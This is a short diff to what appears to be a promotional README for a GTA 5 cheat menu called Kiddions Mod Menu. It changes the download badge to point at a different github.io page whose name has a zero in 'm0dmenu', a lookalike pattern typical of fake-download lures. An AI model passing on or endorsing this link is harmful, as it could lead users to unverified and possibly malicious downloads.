@@ -2,7 +2,7 @@
 
 Kiddions Mod Menu is a widely recognized, user-friendly modding tool designed for GTA 5 players who want to elevate their gameplay with enhanced customization and seamless control over game mechanics. This powerful menu offers a vast array of features that allow users to explore, modify, and personalize their GTA 5 experience with ease and reliability.
 
-[![Download Kiddions Mod Menu](https://img.shields.io/badge/Download-Kiddions_Mod_Menu-green)](https://kiddions-mod-menu-cheat.github.io/.github)
+[![Download Kiddions Mod Menu](https://img.shields.io/badge/Download-Kiddions_Mod_Menu-green)](https://kiddions-m0dmenu-download.github.io/.github/)
 
 ---
 
